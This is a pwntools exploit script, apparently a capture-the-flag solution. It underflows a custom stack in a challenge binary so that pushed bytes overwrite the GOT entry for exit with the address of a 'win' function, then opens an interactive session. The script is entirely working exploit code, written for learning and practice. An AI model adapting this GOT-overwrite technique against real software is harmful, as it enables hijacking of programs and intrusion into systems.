from pwn import *
#from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0 # Change to 1 to run the exploit on the remote instance

GDB=False
e = context.binary = ELF("./chal")

if GDB:
    context.terminal = ['tmux', 'splitw','-h']

win = e.symbols['win']
print(f"Win @ {hex(win)}")

got_exit = e.got['exit']

# From nm chal
stack = 0x00000000004040c0

delta = stack - got_exit

print(f"Delta: {delta}")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()
    if GDB:
        gdb.attach(p, gdbscript="""
            b main
            b *0x000000000040158b
            continue
        """)

io = r = p # use whichever you like for communication

def push(val): 
    print(f"Pushing {val}")
    p.sendlineafter(b">",b"1")
    p.sendafter(b">",val);

def pop(): 
    p.sendlineafter(b">",b"2")

def print_stack(): 
    p.sendlineafter(b">",b"3")
    return p.recv()
    
def exit():
    p.sendlineafter(b">",b"4")

for i in range(delta):
    pop()


for i in p64(win):
    # 2 byte reads
    push(bytearray([i]))

exit()
p.interactive()
